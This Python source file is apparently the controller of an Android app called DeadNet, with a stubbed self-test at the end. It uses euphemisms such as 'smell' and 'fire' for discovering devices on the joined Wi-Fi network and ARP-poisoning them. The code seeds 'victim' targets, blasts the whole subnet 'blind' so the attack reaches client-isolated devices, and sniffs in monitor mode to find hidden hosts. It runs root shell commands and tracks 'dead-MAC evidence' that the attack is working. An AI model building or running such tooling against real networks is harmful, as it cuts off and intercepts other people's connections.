"""
AppController — the brain behind the associate-first DeadNet redesign. Bridges the
Kivy screens to the engine layer (arbiter / radio / finders / emission /
birdobserver).

New operating model (owner-revised: "there's nothing to monitor when you're not
focusing", so the monitor-mode router-discovery phase is GONE):

  DETECT   -> enumerate the Wi-Fi airspace(s) the phone is ALREADY associated to
              (wlan0, and wlan1 if the framework raised a 2nd STA). No radio seize,
              no monitor. Selection is IMPLICIT: whatever the owner joined in
              Android settings *is* the scope. You can only smell air you hold a
              key to — that is the safety model.

  SMELL    -> stay associated; a wired Finder sweeps the associated subnet(s) into
              known_scents (append-only master store), fuzzy-grouped by
              like-electronics (vendor/OUI). This is the full-space smell, scoped to
              the airspace(s) of interest.

  FIRE     -> one of two forks, both with the BirdObserver airborne:
                * UNFOCUSED : attention spread evenly across every electronic smelled
                              on the airspace. If one keeps mailing envelopes despite
                              the owner's transmissions, the bird hones attention onto
                              that non-compliant electronic.
                * FOCUSED   : identical, but the scope is limited up front to the
                              electronics the owner picked.
              Internally the native emitter always runs per-host (EmitMode.FOCUSED)
              so the bird can hone in BOTH forks; the fork only decides which hosts
              seed the attention set.

Release-back / "leave it how it was found": begin_smell() snapshots the clean Wi-Fi
baseline before touching any OEM knob; release() restores it. Because we never seize
the radio into monitor, release does NOT toggle Wi-Fi off/on (that would drop adb),
it only restores the dual-STA / multi-internet knobs to how they were found.

Headless-safe: the Kivy Logger import is guarded and every device call is funnelled
through the engine modules, so this file imports and its state machine self-tests
off-device. Stdlib + engine only.
"""
from __future__ import annotations

import enum
import re
import threading
import time
from typing import Callable, List, Optional, Tuple

try:
    from kivy.logger import Logger
except Exception:  # off-device
    class _L:
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

from engine.contracts import (
    DB_KNOWN_SCENTS, DB_ATTENTION, DB_STATE,
    Knobs, EmitMode, ScanPhase, CardState,
    NetInfo, AttentionEntry, now_ms,
)
from engine.arbiter import RowReaderArbiter
from engine.radio import RadioController
from engine.toolbroker import ToolBroker

DEADNET_PREF = "DeadNet"


class Preset(enum.Enum):
    NONE = "none"
    LOCK = "lock"            # associated + smelling (ready to fire)


class Mode(enum.Enum):
    IDLE = "idle"            # radio with Android, nothing running
    LOCKED = "locked"        # associated + wired Finder smelling, ready to fire
    FIRING = "firing"        # emitter airborne


class AppController:
    def __init__(self, appdir: str, managed_iface: str = "wlan0",
                 on_event: Optional[Callable[[str, dict], None]] = None):
        self.appdir = appdir
        self.managed_iface = managed_iface
        self._emit = on_event or (lambda kind, data: None)

        self.knobs = Knobs()
        self.preset = Preset.NONE
        self.mode = Mode.IDLE
        self.net: Optional[NetInfo] = None

        # Detect/Smell flow state.
        self.airspaces_list: List[dict] = []   # associated airspaces last enumerated
        self.adhd: bool = False                # True => request a 2nd STA ("double guns")
        self.monitor_dwell_s: float = 20.0     # deep (monitor) smell sniff window
        self.focused: bool = False             # FIRE fork: True=picked-only, False=whole
        self.links: dict = {}                  # post-associate link summary

        self.arbiter = RowReaderArbiter(appdir)
        self.radio = RadioController(managed_iface)
        self.toolbroker = ToolBroker(appdir)

        # lazily-built engine services (device-touching)
        self._finder = None
        self._netfetcher = None
        self._emission = None
        self._rsm = None
        self._bird = None
        self._survival = None            # SurvivalMonitor (feeds the live gauges)
        self._survival_sample = None     # latest SurvivalSample
        self._passive = None             # PassiveFinder (ARP-listen discovery during fire)

        self._lock = threading.RLock()

    # -- event helper -------------------------------------------------------
    def emit(self, kind: str, **data) -> None:
        try:
            self._emit(kind, data)
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: on_event({kind}) raised {exc}")

    # -- capability snapshot (for the Detect screen) ------------------------
    def capabilities(self) -> dict:
        caps = self.toolbroker.capabilities()
        return {
            "state": self.radio.state.value,
            "associated": self.radio.is_associated(),
            "tools": {k: bool(v) for k, v in caps.items()},
            "magisk": self.toolbroker.magisk_module_installed(),
        }

    # =======================================================================
    # DETECT  (enumerate the airspaces we are ALREADY associated to — no seize)
    # =======================================================================
    def detect(self) -> bool:
        """Owner hits 'Detect': read which Wi-Fi airspace(s) the phone is joined
        to right now. No radio seize, no monitor — selection is implicit in what
        the owner associated with in Android settings."""
        self.airspaces_list = self.airspaces()
        self.emit("detected", airspaces=self.airspaces_list)
        return True

    def airspaces(self) -> List[dict]:
        """The airspace(s) we are associated to: wlan0 always, wlan1 if the OEM
        dual-STA raised a 2nd link. Each is {iface, ssid, bssid}."""
        out: List[dict] = []
        ssid = self.radio.current_ssid()
        bssid = self.radio.is_associated() or ""
        if ssid or bssid:
            out.append({"iface": self.managed_iface, "ssid": ssid, "bssid": bssid})
        sec = self.radio.secondary_iface()
        if sec:
            out.append({"iface": sec, "ssid": "",
                        "bssid": (self.radio.link_bssid(sec) or "")})
        return out

    # =======================================================================
    # SMELL  (associate-ensure -> wired subnet sweep scoped to the airspace)
    # =======================================================================
    def begin_smell(self, adhd: Optional[bool] = None) -> bool:
        """Begin smelling the associated airspace. We stay associated (no monitor):
        snapshot the clean baseline, best-effort permit a 2nd STA if ADHD, confirm
        the managed link, discover the subnet, and start the wired Finder sweeping
        it into known_scents. Empirically a monitor cannot run beside the associated
        link, so smelling is subnet/ARP-based on the live association."""
        with self._lock:
            self.adhd = self.adhd if adhd is None else bool(adhd)
            want_second = self.adhd
            # snapshot "how it was found" before we touch any OEM knob
            try:
                self.radio.capture_baseline()
            except Exception:  # noqa: BLE001
                pass
            if want_second:
                try:
                    self.radio.set_dual_sta(True)
                except Exception:  # noqa: BLE001
                    pass
            if not self.radio.ensure_managed():
                self.emit("error", msg="not associated — join a Wi-Fi you own first")
                return False
            from engine.iface import discover_iface_net
            try:
                self.net = discover_iface_net(self.managed_iface)
            except Exception as exc:  # noqa: BLE001
                self.emit("error", msg=f"net discovery failed: {exc}")
                return False
            self._start_wired_finder()
            self.links = self._link_summary(want_second)
            self.preset = Preset.LOCK
            self.mode = Mode.LOCKED
            self.emit("smelling", links=self.links, net=self._net_summary())
            self.emit("mode", mode=self.mode.value, preset=self.preset.value,
                      net=self._net_summary())
            return True

    # back-compat alias (older callers / tests)
    def connect(self, adhd: Optional[bool] = None) -> bool:
        return self.begin_smell(adhd=adhd)

    # =======================================================================
    # DEEP SMELL  (monitor-mode sniff interlude — sees through client isolation)
    # =======================================================================
    def _assoc_channel(self) -> Optional[int]:
        """The channel wlan0 is currently associated on, parsed from `iw dev`.
        Needed to tune the monitor to the joined airspace (we lock, never hop)."""
        try:
            from engine import rootshell
            out = rootshell.su(f"iw dev {self.managed_iface} info") or ""
        except Exception:  # noqa: BLE001
            return None
        m = re.search(r"channel\s+(\d+)", out)
        return int(m.group(1)) if m else None

    def begin_monitor_smell(self, dwell_s: Optional[float] = None) -> bool:
        """The 2nd smell modality: briefly drop the association, seize the radio
        into monitor on the JOINED channel, sniff 802.11 for `dwell_s` seconds
        (attributing every heard device to its airspace by the BSSID in its
        frames, filtered to the one we joined), then release + reassociate and
        resume the normal associated/LOCKED state.

        Unlike active smell this sees client-isolated devices, because monitor
        reads the air directly instead of asking the router to forward packets.
        It runs SYNCHRONOUSLY (callers run it on a worker); the radio is offline
        for the sniff window (USB adb survives, Wi-Fi adb will drop)."""
        dwell = self.monitor_dwell_s if dwell_s is None else float(dwell_s)
        with self._lock:
            bssid = (self.radio.is_associated() or "").strip()
            ssid = self.radio.current_ssid()
            if not bssid:
                self.emit("error", msg="deep smell needs an association — Detect/Smell first")
                return False
            channel = self._assoc_channel() or 0
            try:
                self.radio.capture_baseline()   # so release restores how it was found
            except Exception:  # noqa: BLE001
                pass
            self.emit("monitor_smelling", ssid=ssid, bssid=bssid, channel=channel,
                      dwell=int(dwell), warn="radio offline during sniff")

        air = None
        seized = False
        try:
            if channel <= 0 or not self.radio.start_recon(channel):
                self.emit("error", msg=f"could not seize monitor on ch{channel} (radio busy?)")
                return False
            seized = True
            from engine.finder_air import FinderAir
            air = FinderAir(self.arbiter, self.radio.mon_iface,
                            net_id=self._attention_net_id(), bssid_filter=bssid)
            air.start()
            t0 = time.time()
            while True:
                elapsed = time.time() - t0
                if elapsed >= dwell:
                    break
                self.emit("monitor_progress", elapsed=int(elapsed), total=int(dwell))
                time.sleep(min(1.0, dwell - elapsed))
        except Exception as exc:  # noqa: BLE001
            self.emit("error", msg=f"deep smell failed: {exc}")
        finally:
            if air is not None:
                try:
                    air.stop()
                except Exception:  # noqa: BLE001
                    pass
            if seized:
                try:
                    self.radio.release_to_android(wait_reconnect=True)
                except Exception:  # noqa: BLE001
                    pass
        # Reconnect: on this phone, monitor churn in dual-STA/Wi-Fi-Aware mode
        # wedges the framework's auto-join — svc/cmd/wpa_cli all fail to re-select
        # the saved network; only an explicit connect (the Settings network tap)
        # recovers it. So if release did not get us back on, pop the Android Wi-Fi
        # panel for a one-tap manual rejoin instead of hanging on a dead auto-join.
        if not self.radio.is_associated():
            try:
                from engine import rootshell
                rootshell.su("am start -a android.settings.WIFI_SETTINGS")
            except Exception:  # noqa: BLE001
                pass
            self.emit("monitor_done", found=len(self.scents()),
                      reconnect="tap your Wi-Fi network to resume, then Smell/Fire")
            return False
        # Back on the air: re-establish the normal associated/LOCKED state so the
        # monitor-captured scents are ready to FIRE. begin_smell re-discovers the
        # subnet, restarts the wired finder, and emits smelling/mode for the UI.
        ok = self.begin_smell(adhd=self.adhd)
        self.emit("monitor_done", found=len(self.scents()))
        return ok

    def _link_summary(self, wanted_second: bool) -> dict:
        """Describe the associated link(s) and which mode we actually got."""
        ssid = self.radio.current_ssid()
        bssid = self.radio.is_associated() or ""
        second = self.radio.secondary_iface()
        if second is not None:
            mode = "double_guns" if wanted_second else "two_links"
        else:
            mode = "single"
        return {
            "wlan0": {"ssid": ssid, "bssid": bssid},
            "wlan1": ({"iface": second} if second else None),
            "mode": mode,
            "wanted_second": wanted_second,
        }

    def _start_wired_finder(self) -> None:
        from engine.finder import Finder, NetFetcher
        self._finder = Finder(
            self.arbiter, self.managed_iface, self.net,
            on_progress=lambda ph, d, t: self.emit("scan", phase=int(ph.value), done=d, total=t))
        # P1 smell is the important pass; run it on a worker so the UI stays live.
        threading.Thread(target=self._run_scan, name="wired-finder", daemon=True).start()
        # Mac-Vacuum keeps the master store fresh as leases rotate.
        self._netfetcher = NetFetcher(
            self.arbiter, self.managed_iface, self.net,
            interval_ms=self.knobs.mac_vacuum_interval_ms)
        # NetFetcher gates its tick on `self.net.iface in focus`, so the focus
        # set must be keyed by iface (the canonical net_id), NOT subnet_cidr —
        # otherwise the membership test never matches and the mac-vacuum never
        # runs.
        self._netfetcher.set_focus_nets([self._attention_net_id()])
        self._netfetcher.start()

    def _run_scan(self) -> None:
        try:
            self._finder.phase1_smell()
            if self.knobs.scan_phases.value >= ScanPhase.P2_FINGERPRINT.value:
                self._finder.phase2_fingerprint()
            self.emit("scan_done")
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: scan failed {exc}")
            self.emit("error", msg=f"scan failed: {exc}")

    def _stop_wired_finder(self) -> None:
        if self._netfetcher is not None:
            try:
                self._netfetcher.stop()
            except Exception:  # noqa: BLE001
                pass
            self._netfetcher = None
        self._finder = None

    # =======================================================================
    # SMELL VIEW  (known_scents, fuzzy-grouped by like-electronics)
    # =======================================================================
    def scents(self) -> List[dict]:
        rows = self.arbiter.read(
            DB_KNOWN_SCENTS,
            "SELECT mac, ip, vendor, ssid, ap_bssid, channel, signal_dbm, "
            "is_station, net_id, last_seen_ms FROM scents ORDER BY last_seen_ms DESC")
        cols = ("mac", "ip", "vendor", "ssid", "ap_bssid", "channel",
                "signal_dbm", "is_station", "net_id", "last_seen_ms")
        return [dict(zip(cols, r)) for r in rows]

    def scent_groups(self) -> List[Tuple[str, List[dict]]]:
        """Fuzzy associator: the smelled electronics lined up by like-kind — all
        the Apple phones in one row, etc. Groups by OUI vendor (blank => 'unknown'),
        biggest family first. Append-only master store: nothing is pruned, only
        regrouped, so a device keeps its place across re-smells."""
        groups: dict = {}
        for s in self.scents():
            key = (s.get("vendor") or "").strip() or "unknown"
            groups.setdefault(key, []).append(s)
        return sorted(groups.items(), key=lambda kv: (-len(kv[1]), kv[0].lower()))

    def selected(self) -> List[dict]:
        rows = self.arbiter.read(
            DB_ATTENTION, "SELECT mac, ip, net_id, weight, pinned FROM attention")
        return [dict(zip(("mac", "ip", "net_id", "weight", "pinned"), r)) for r in rows]

    def select(self, mac: str, weight: float = 1.0, pinned: bool = True) -> None:
        """'Select +' — pin a scent into the attention list for a FOCUSED fire."""
        row = self.arbiter.read(
            DB_KNOWN_SCENTS, "SELECT ip, net_id FROM scents WHERE mac=?", (mac,))
        ip, net_id = (row[0] if row else ("", ""))
        self.arbiter.write(
            DB_ATTENTION,
            "INSERT OR REPLACE INTO attention(mac, ip, net_id, weight, pinned) "
            "VALUES(?,?,?,?,?)", (mac, ip, net_id, float(weight), 1 if pinned else 0))
        self.emit("selected", mac=mac)

    def deselect(self, mac: str) -> None:
        self.arbiter.write(DB_ATTENTION, "DELETE FROM attention WHERE mac=?", (mac,))
        self.emit("deselected", mac=mac)

    def clear_selection(self) -> None:
        self.arbiter.write(DB_ATTENTION, "DELETE FROM attention")
        self.emit("selection_cleared")

    # =======================================================================
    # CONFIGURE & TRIGGER  (fire the emitter; focused or unfocused fork)
    # =======================================================================
    def set_focused(self, focused: bool) -> None:
        self.focused = bool(focused)
        self.emit("fork", focused=self.focused)

    def fire(self, focused: Optional[bool] = None, on_stats=None) -> bool:
        """Launch the native emitter on the associated link with the BirdObserver
        airborne + the 100 ms rehydrator + the live-gauge SurvivalMonitor. Requires
        an associated, smelling link (Mode.LOCKED).

        focused=True  -> aim only at the electronics the owner picked.
        focused=False -> aim at every electronic smelled on the airspace (baseline),
                         letting the bird hone onto any that keep leaking.
        """
        with self._lock:
            if self.mode != Mode.LOCKED:
                self.emit("error", msg="FIRE needs an associated, smelling link")
                return False
            focused = self.focused if focused is None else bool(focused)
            self.focused = focused
            from engine.emission import EmissionController
            from engine.birdobserver import BirdObserver

            # Seed the attention/focus set. emit.cpp only transmits at focus
            # entries, so an empty set would send nothing. The bird hones in BOTH
            # forks, so the emitter always runs per-host (EmitMode.FOCUSED); the
            # fork only decides WHICH hosts seed the set.
            n_targets = self._seed_targets(focused)
            self.knobs.emit_mode = EmitMode.FOCUSED
            if n_targets == 0:
                self.emit("error", msg=(
                    "nothing to aim at — pick electronics (focused) or let the "
                    "smell finish (unfocused)"))
                return False
            our_mac = self._iface_mac(self.managed_iface)
            self._emission = EmissionController(self.arbiter, self.appdir, self.knobs)
            # Pin the transmitter's pump filter to the SAME net_id the attention
            # rows carry (iface-keyed), so focused picks are not filtered out of
            # the focus buffer.
            self._emission.add_transmitter(
                self.managed_iface, self.net, our_mac=our_mac,
                net_id=self._attention_net_id())
            # UNFOCUSED = blast the WHOLE computed subnet blind (vanilla-style),
            # so the attack lands even on a client-isolated LAN where smell sees
            # almost nothing. FOCUSED stays limited to the owner's picks.
            if not focused and self.net is not None:
                self._emission.set_whole_subnet_blind(
                    self.net.subnet_cidr,
                    our_ip=self.net.device_ip or "",
                    gw_ip=self.net.gateway_ipv4 or "")
            self._emission.start()  # also starts its own 100 ms rehydrator

            # feed the sniffer-sourced escaped-envelope counts into that rehydrator
            if on_stats is not None and getattr(self._emission, "_rehydrator", None):
                self._emission._rehydrator.set_escaped_source(on_stats)

            # Live gauges: the native `sniff` binary on the associated link counts
            # our ARP TX, surviving (leaked) packets and dead-MAC evidence — the
            # proven survival-gauges feed. It measures the aggregate regardless of
            # focus set, so the gauges work in focused AND unfocused fire.
            self._start_survival(our_mac)

            # Passive discovery: listen to ARP on the associated link while we
            # fire. ARP is link-layer broadcast (reaches us even under client
            # isolation that silently drops active probes), and the poison
            # provokes victims to re-ARP — so the attack itself populates the
            # electronic list with hosts active smell could never knock awake.
            self._start_passive()

            if self.knobs.bird_airborne:
                self._bird = BirdObserver(self.arbiter, self.knobs)
                self._bird.start()

            self.mode = Mode.FIRING
            self.emit("mode", mode=self.mode.value, preset=self.preset.value,
                      focused=focused)
            return True

    def state_metrics(self) -> dict:
        """Metrics for the gauges (polled on a Clock tick). Preferred source is the
        live SurvivalMonitor sample (our ARP TX / surviving-leaks / evidence off the
        associated link); falls back to the DB_STATE rollup (emit.cpp native
        per-target stats) when no survival sample is in yet."""
        s = self._survival_sample
        if s is not None:
            return {"tx_ps": s.arp_tx_ps, "leaking": s.surv_ps,
                    "evidence": s.evidence_ps,
                    "confirmed": bool(s.confirmed) and self.mode == Mode.FIRING,
                    "targets": len(self.selected())}
        rows = self.arbiter.read(
            DB_STATE, "SELECT tx_pps, escaped_pkts, compliant FROM metrics")
        tx = sum((r[0] or 0.0) for r in rows)
        leaking = sum(1 for r in rows if not r[2])
        evidence = sum((r[1] or 0) for r in rows)
        confirmed = bool(rows) and leaking == 0 and self.mode == Mode.FIRING
        return {"tx_ps": tx, "leaking": leaking, "evidence": evidence,
                "confirmed": confirmed, "targets": len(rows)}

    def _attention_net_id(self) -> str:
        """The canonical net_id used for attention rows AND the transmitter's
        pump filter. It MUST match the convention the master store (scents) is
        keyed by — the Finder writes `scents.net_id = self.net.iface`, select()
        and the BirdObserver copy that through, and NetFetcher gates on
        `self.net.iface in focus`. So the whole pipeline keys on the iface, NOT
        subnet_cidr. Mixing the two silently drops rows from the emit focus set
        (the pump filters attention `WHERE net_id = tx.net_id`), which is why a
        focused fire used to leave the gauges flat — the picks carried the
        iface-style net_id while the transmitter filtered on subnet_cidr."""
        if self.net is None:
            return self.managed_iface
        return self.net.iface or self.managed_iface

    def _seed_targets(self, focused: bool) -> int:
        """Fill the attention/focus set so emit.cpp has something to aim at, and
        return the number of victim targets (excludes the gateway).

          * focused   : keep only the owner's picks (already pinned in attention via
                        select()); just make sure the gateway is present.
          * unfocused : add every smelled host on the connected subnet, evenly.
        The gateway is pinned + marked so emit can recover its IPv4 for the
        victim-side poison; emit never victimizes it. Our own device is skipped."""
        if self.net is None:
            return 0
        net_id = self._attention_net_id()
        our_ip = self.net.device_ip or ""
        gw_ip = self.net.gateway_ipv4 or ""
        gw_mac = self.net.gateway_mac or ""
        if gw_mac and gw_ip:
            self.arbiter.write(
                DB_ATTENTION,
                "INSERT OR REPLACE INTO attention(mac, ip, net_id, weight, pinned) "
                "VALUES(?,?,?,?,1)", (gw_mac, gw_ip, net_id, 1.0))
        if focused:
            # picks are already pinned in attention (sync, via select()). They
            # carry the scent's net_id; normalize EVERY attention row to the
            # transmitter's net_id so the emission pump's `WHERE net_id=?` filter
            # includes them — otherwise emit has nothing to poison and the
            # gauges read flat. One sync UPDATE at fire (not a hot path); all
            # attention here belongs to the single connected net.
            self.arbiter.write(
                DB_ATTENTION, "UPDATE attention SET net_id=? WHERE net_id != ?",
                (net_id, net_id))
            rows = self.arbiter.read(
                DB_ATTENTION, "SELECT mac FROM attention WHERE mac != ?", (gw_mac,))
            return len(rows)
        # unfocused: seed every smelled host so identified ones carry a real MAC
        # (cleaner unicast victim-poison) and the bird can hone them. The WHOLE
        # subnet is additionally blasted BLIND by the emission pump
        # (set_whole_subnet_blind in fire()), so the attack lands even on a
        # client-isolated LAN where smell sees almost nothing. Synchronous write
        # (one-shot at FIRE, not a hot path).
        rows = self.arbiter.read(
            DB_KNOWN_SCENTS,
            "SELECT mac, ip FROM scents WHERE mac != '' AND ip != ''")
        for mac, ip in rows:
            if ip in (our_ip, gw_ip) or mac == gw_mac:
                continue
            self.arbiter.write(
                DB_ATTENTION,
                "INSERT OR IGNORE INTO attention(mac, ip, net_id, weight, pinned) "
                "VALUES(?,?,?,1.0,0)", (mac, ip, net_id))
        # Target count = the whole subnet (blind blast), so FIRE never refuses
        # while associated even if nothing was smelled. Fall back to the smelled
        # count if the subnet CIDR is unknown.
        return self._subnet_host_count(our_ip, gw_ip) or len(rows)

    def _subnet_host_count(self, our_ip: str, gw_ip: str) -> int:
        cidr = self.net.subnet_cidr if self.net else ""
        if not cidr:
            return 0
        try:
            import ipaddress
            net = ipaddress.ip_network(cidr, strict=False)
            excl = {our_ip, gw_ip,
                    str(net.network_address), str(net.broadcast_address)}
            return sum(1 for h in net.hosts() if str(h) not in excl)
        except ValueError:
            return 0

    # -- live-gauge survival monitor ----------------------------------------
    def _iface_mac(self, iface: str) -> str:
        from engine import rootshell
        return rootshell.su(f"cat /sys/class/net/{iface}/address").strip()

    def _copy_sniff(self) -> Optional[str]:
        """Copy sniff.<arch> into appdir (root-owned, +x), mirroring emission's
        binary prep. Returns the on-device path, or None if unavailable."""
        try:
            import os
            from engine import rootshell
            from engine.emission import _arch_suffix
            # assets live beside this file (apk/assets), not under appdir
            here = os.path.dirname(os.path.abspath(__file__))
            src = os.path.join(here, "assets", f"sniff.{_arch_suffix()}")
            dst = os.path.join(self.appdir, f"sniff.{_arch_suffix()}")
            # one persistent-shell round-trip (was three separate su -c forks)
            rc, out = rootshell.su_rc(
                f"cp -rf {src} {dst} && chmod 777 {dst} && chown root {dst}")
            if rc != 0:
                Logger.error(f"{DEADNET_PREF}: sniff copy failed rc={rc} {out!r}")
                return None
            return dst
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: sniff copy failed {exc}")
            return None

    def _start_passive(self) -> None:
        """Start the ARP-listen passive finder on the associated link (discovery
        that works under client isolation). Best-effort: a failure never blocks fire."""
        try:
            from engine.finder_passive import PassiveFinder
            self._passive = PassiveFinder(
                self.arbiter, self.managed_iface, net_id=self._attention_net_id())
            self._passive.start()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: passive finder failed to start {exc}")
            self._passive = None

    def _on_survival(self, sample) -> None:
        self._survival_sample = sample

    def _start_survival(self, our_mac: str) -> None:
        try:
            from survival_monitor import SurvivalMonitor
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: SurvivalMonitor import failed {exc}")
            return
        sniff = self._copy_sniff()
        if not sniff:
            return
        gw = (self.net.gateway_mac if self.net else "") or ""
        self._survival_sample = None
        self._survival = SurvivalMonitor(
            sniff, self.managed_iface, gw, our_mac, on_sample=self._on_survival)
        self._survival.start()

    def cease(self) -> None:
        with self._lock:
            for svc in ("_bird", "_rsm", "_emission", "_survival", "_passive"):
                obj = getattr(self, svc, None)
                if obj is not None:
                    try:
                        obj.stop()
                    except Exception:  # noqa: BLE001
                        pass
                    setattr(self, svc, None)
            self._survival_sample = None
            if self.mode == Mode.FIRING:
                self.mode = Mode.LOCKED
                self.emit("mode", mode=self.mode.value, preset=self.preset.value)

    # =======================================================================
    # RELEASE / SHUTDOWN
    # =======================================================================
    def release(self) -> None:
        """Give the radio back to Android and stop every service. Safe to re-call.
        Because we never seized monitor, this only restores the OEM dual-STA /
        multi-internet knobs to how they were found (no disruptive Wi-Fi toggle,
        so adb/tailscale on wlan0 survive)."""
        with self._lock:
            self.cease()
            self._stop_wired_finder()
            try:
                self.radio.release_to_android(wait_reconnect=False)
            except Exception:  # noqa: BLE001
                pass
            self.airspaces_list = []
            self.links = {}
            self.preset = Preset.NONE
            self.mode = Mode.IDLE
            self.emit("mode", mode=self.mode.value, preset=self.preset.value)

    def shutdown(self) -> None:
        self.release()
        try:
            self.arbiter.close()
        except Exception:  # noqa: BLE001
            pass

    # -- helpers ------------------------------------------------------------
    def _net_summary(self) -> dict:
        n = self.net
        if n is None:
            return {}
        return {"iface": n.iface, "device_ip": n.device_ip,
                "subnet": n.subnet_cidr, "gw4": n.gateway_ipv4,
                "gw6": n.gateway_ipv6, "gw_mac": n.gateway_mac}


if __name__ == "__main__":
    # Off-device state-machine self-test: the device-touching engine services are
    # stubbed; we verify the associate-first lifecycle + focused/unfocused fire gating.
    import tempfile

    events: List[tuple] = []
    ctl = AppController(tempfile.mkdtemp(),
                        on_event=lambda k, d: events.append((k, d)))

    # stub the radio + engine services so nothing touches a device
    class _FakeRadio:
        mon_iface = "mon0"
        def __init__(self): self.state = CardState.ANDROID; self.recon_ch = None
        def ensure_managed(self, **k): self.state = CardState.MANAGED; return True
        def is_associated(self): return "aa:bb:cc:dd:ee:ff"
        def release_to_android(self, **k): self.state = CardState.ANDROID; return True
        def current_ssid(self): return "HomeNet"
        def secondary_iface(self): return None
        def link_bssid(self, iface): return None
        def capture_baseline(self): return {}
        def restore_baseline(self): pass
        def set_dual_sta(self, on): pass
        def start_recon(self, channel=6): self.state = CardState.MONITOR; self.recon_ch = channel; return True
    ctl.radio = _FakeRadio()

    _NET = NetInfo(iface="wlan0", device_ip="192.168.1.50", cidr=24,
                   subnet_cidr="192.168.1.0/24", gateway_ipv4="192.168.1.1",
                   gateway_ipv6="fe80::1", gateway_mac="aa:bb:cc:00:00:01")
    import engine.iface as _if
    _if.discover_iface_net = lambda iface: _NET

    class _FakeFinder:
        def __init__(self, *a, **k): pass
        def phase1_smell(self): return []
        def phase2_fingerprint(self, *a, **k): pass
    class _FakeNetFetcher:
        def __init__(self, *a, **k): pass
        def set_focus_nets(self, *a): pass
        def start(self): pass
        def stop(self): pass
    import engine.finder as _f
    _f.Finder = _FakeFinder
    _f.NetFetcher = _FakeNetFetcher

    class _FakeEmission:
        def __init__(self, *a, **k): self._rehydrator = None; self.blind = None
        def add_transmitter(self, *a, **k): pass
        def set_whole_subnet_blind(self, cidr, our_ip="", gw_ip=""):
            self.blind = cidr; return 0
        def start(self): pass
        def stop(self): pass
    class _FakeBird:
        def __init__(self, *a, **k): pass
        def start(self): pass
        def stop(self): pass
    import engine.emission as _em
    import engine.birdobserver as _bo
    _em.EmissionController = _FakeEmission
    _bo.BirdObserver = _FakeBird

    # passive ARP finder + monitor-mode air finder: stub so no real `su`/tcpdump
    class _FakeCapture:
        started = []
        def __init__(self, *a, **k): self.a = a; self.k = k; self._on = False
        def start(self): self._on = True; _FakeCapture.started.append(self.k.get("net_id") or self.a)
        def stop(self): self._on = False
    import engine.finder_passive as _fp
    import engine.finder_air as _fa
    _fp.PassiveFinder = _FakeCapture
    _fa.FinderAir = _FakeCapture
    # survival monitor is imported lazily inside _start_survival; stub the module
    import sys as _sys
    import types as _types
    _sm = _types.ModuleType("survival_monitor")
    class _FakeSurv:
        def __init__(self, *a, **k): pass
        def start(self): pass
        def stop(self): pass
    _sm.SurvivalMonitor = _FakeSurv
    _sys.modules["survival_monitor"] = _sm
    ctl._copy_sniff = lambda: "/tmp/sniff"   # pretend the binary is staged

    # 1) FIRE must be refused while not locked
    assert ctl.fire() is False

    # 2) DETECT: enumerate the associated airspace (no seize)
    assert ctl.detect() is True
    assert ctl.airspaces_list == [{"iface": "wlan0", "ssid": "HomeNet",
                                   "bssid": "aa:bb:cc:dd:ee:ff"}], ctl.airspaces_list
    assert ctl.mode == Mode.IDLE, "detect must not change radio mode"

    # 3) SMELL: associate-ensure + discover + wired finder
    assert ctl.begin_smell(adhd=True) is True
    assert ctl.mode == Mode.LOCKED and ctl.net.subnet_cidr == "192.168.1.0/24"
    assert ctl.links["mode"] == "single"  # fake has no wlan1
    assert ctl.links["wlan0"]["ssid"] == "HomeNet"

    # 4) seed a couple of scents
    ctl.arbiter.write(DB_KNOWN_SCENTS,
                      "INSERT OR REPLACE INTO scents(mac, ip, vendor, net_id, last_seen_ms) "
                      "VALUES(?,?,?,?,?)", ("de:ad:00:00:00:01", "192.168.1.77", "Apple", "lan", now_ms()))
    ctl.arbiter.write(DB_KNOWN_SCENTS,
                      "INSERT OR REPLACE INTO scents(mac, ip, vendor, net_id, last_seen_ms) "
                      "VALUES(?,?,?,?,?)", ("de:ad:00:00:00:02", "192.168.1.78", "Apple", "lan", now_ms()))
    ctl.arbiter.write(DB_KNOWN_SCENTS,
                      "INSERT OR REPLACE INTO scents(mac, ip, vendor, net_id, last_seen_ms) "
                      "VALUES(?,?,?,?,?)", ("de:ad:00:00:00:03", "192.168.1.79", "", "lan", now_ms()))
    assert len(ctl.scents()) == 3
    groups = dict(ctl.scent_groups())
    assert len(groups["Apple"]) == 2 and len(groups["unknown"]) == 1, ctl.scent_groups()

    # 5) UNFOCUSED fire: every smelled host seeds the set (3 victims), bird airborne
    assert ctl.fire(focused=False) is True
    assert ctl.mode == Mode.FIRING
    assert ctl.knobs.emit_mode == EmitMode.FOCUSED, "emit always per-host so bird hones"
    victims = [r["mac"] for r in ctl.selected() if r["mac"] != "aa:bb:cc:00:00:01"]
    assert len(victims) == 3, victims
    assert ctl._emission.blind == "192.168.1.0/24", "unfocused must blast whole subnet blind"
    assert "wlan0" in _FakeCapture.started, "passive ARP finder must ride along during fire"
    assert ctl._passive is not None, "passive finder must be live while firing"
    ctl.cease()
    assert ctl.mode == Mode.LOCKED
    assert ctl._passive is None, "cease() must stop the passive finder"

    # 6) FOCUSED fire: only the owner's picks seed the set
    ctl.clear_selection()
    ctl.select("de:ad:00:00:00:01")
    assert ctl.fire(focused=True) is True
    victims = [r["mac"] for r in ctl.selected() if r["mac"] != "aa:bb:cc:00:00:01"]
    assert victims == ["de:ad:00:00:00:01"], victims
    assert ctl._emission.blind is None, "focused must NOT blast the whole subnet"
    ctl.cease()

    # 7) FOCUSED with no picks is refused (nothing to aim at)
    ctl.clear_selection()
    assert ctl.fire(focused=True) is False

    # 8) DEEP (monitor) SMELL: seize monitor on the joined channel, sniff, release,
    #    reassociate, and come back LOCKED and ready to fire.
    ctl._assoc_channel = lambda: 11          # avoid touching a real `iw`
    _FakeCapture.started = []
    mon_events = []
    _prev_emit = ctl._emit
    ctl._emit = lambda k, d: (mon_events.append(k), _prev_emit(k, d))
    assert ctl.begin_monitor_smell(dwell_s=0) is True
    assert ctl.radio.recon_ch == 11, "monitor must lock to the joined channel"
    assert ctl.mode == Mode.LOCKED, "deep smell must leave us ready to fire"
